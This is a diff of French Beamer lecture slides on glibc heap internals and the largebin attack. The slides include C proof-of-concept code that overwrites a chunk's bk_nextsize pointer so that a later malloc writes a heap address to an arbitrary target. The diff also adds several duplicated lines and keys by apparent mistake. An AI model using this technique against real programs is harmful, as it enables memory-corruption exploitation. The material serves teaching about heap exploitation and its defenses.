@@ -73,9 +73,21 @@
         numbersep=5pt,
         xleftmargin=0.7em
     },
+    minted options={
+        fontsize=\scriptsize,
+        breaklines,
+        breakanywhere,
+        autogobble,
+        escapeinside=@@,
+        linenos,
+        numbersep=5pt,
+        xleftmargin=0.7em
+    },
     colback=white,
     colframe=black,
+    colframe=black,
     boxrule=1pt,
+    arc=0pt,
     arc=0pt,
     left=6pt, right=4pt, top=4pt, bottom=4pt,
     drop shadow=black!30!white,
@@ -164,7 +176,7 @@
 \end{frame}
 
 
-\begin{frame}[plain]{C'est quoi malloc(1 /3)}
+\begin{frame}{C'est quoi malloc(1 /3)}
 
     \begin{center}
         \begin{tikzpicture}[
@@ -203,7 +215,7 @@
     \end{center}
 
 \end{frame}
-\begin{frame}[plain]{C'est quoi malloc(2 /3)}
+\begin{frame}{C'est quoi malloc(2 /3)}
 
     \begin{minipage}{0.40\textwidth}
         \begin{tikzpicture}[
@@ -246,7 +258,7 @@
 
 \end{frame}
 
-\begin{frame}[plain]{C'est quoi malloc(3 /3)}
+\begin{frame}{C'est quoi malloc(3 /3)}
 
     \begin{minipage}{0.40\textwidth}
         \begin{tikzpicture}[
@@ -512,13 +524,14 @@
         \begin{itemize}
             \item Liste \textbf{doublement chaînée FIFO}
             \item Tailles : \texttt{0x400} → \texttt{limite mmap (128ko)}
+            \item Tailles : \texttt{0x400} → \texttt{limite mmap (128ko)}
         \end{itemize}
 
     \end{minipage}
 
 \end{frame}
 
-\begin{frame}[plain]{Exemple largebins}
+\begin{frame}{Exemple largebins}
 
     \begin{tikzpicture}[
         bin/.style={
@@ -548,6 +561,9 @@
         % ===========================
         % Chunks
         % ===========================
+        \node[chunk, right=1cm of bin63] (A) {A : 0x480};
+        \node[chunk, right=1cm of bin64] (B) {B : 0x520};
+        \node[chunk, right=1cm of bin64b] (C) {C : 0x580};
         \node[chunk, right=1cm of bin63] (A) {A : 0x480};
         \node[chunk, right=1cm of bin64] (B) {B : 0x520};
         \node[chunk, right=1cm of bin64b] (C) {C : 0x580};
@@ -808,10 +824,10 @@
     \end{ccode}
 \end{frame}
 
-\begin{frame}[plain,fragile]{Largebin attack(1 /3)}
+\begin{frame}[fragile]{Largebin attack(1 /3)}
     \begin{ccode}
         int main(){
-                /* Désactiver l'I/O buffering pour protéger la heap */
+                /* Disable IO buffering to prevent stream from interfering with heap */
                 setvbuf(stdin, NULL, _IONBF, 0);
                 setvbuf(stdout, NULL, _IONBF, 0);
                 setvbuf(stderr, NULL, _IONBF, 0);
@@ -824,7 +840,7 @@
                 size_t *g3 = malloc(0x438);
                 free(p2);
 
-                p1[3] = (size_t)((&target) - 4); /* Écrasement pointeur métadonnées */
+                p1[3] = (size_t)((&target) - 4); /* Overwrite metadata pointer */
                 size_t *g4 = malloc(0x438);
                 assert((size_t)(p2 - 2) == target);
                 return 0;
@@ -832,17 +848,16 @@
     \end{ccode}
 \end{frame}
 
-\begin{frame}[plain,fragile]{Largebin attack(2 /3)}
+\begin{frame}[fragile]{Largebin attack(2 /3)}
     \begin{ccode}
         int main(){
-                // ... setup omitted ...
                 size_t *p1 = malloc(0x428), *g1 = malloc(0x18);
                 size_t *p2 = malloc(0x418), *g2 = malloc(0x18);
 
                 free(p1);
                 size_t *g3 = malloc(0x438);
                 free(p2);
-                // ...
+
             }
     \end{ccode}
 
@@ -908,16 +923,13 @@
 \end{frame}
 
 
-\begin{frame}[plain,fragile]{Largebin attack(3 /3)}
+\begin{frame}[fragile]{Largebin attack(3 /3)}
     \begin{ccode}
-        int main() {
-                // ... allocations & frees omitted ...
-                
-                /* Overwrite metadata pointer (bk_nextsize) */
+        int main()
+        {
+                /* Overwrite metadata pointer */
                 p1[3] = (size_t)((&target) - 4);
                 size_t *g4 = malloc(0x438);
-                
-                // target -> p2
             }
     \end{ccode}
 
@@ -977,7 +989,7 @@
         % corruption flèche p1 → target (slide 2)
         \visible<2>{
             \draw[nextarrow] (p1.north) -- (target.south)
-            node[midway, right]{écrasement fd\_nextsize};
+            node[midway, right]{overwrite fd\_nextsize};
         }
 
         % ===========================
@@ -1024,8 +1036,10 @@
 
 \section{Défenses et Perspectives (4 min)}
 
+\begin{frame}{ASLR et Fuite d\'Adresses (Leacks)}
+\end{frame}
 
-\begin{frame}[plain]{Évolutions : GLIBC 2.42 \& 2.43}
+\begin{frame}{Évolutions : GLIBC 2.42 \& 2.43}
     \textbf{GLIBC 2.42 (Août 2025)}
     \vspace{-0.2cm}
     \begin{itemize}
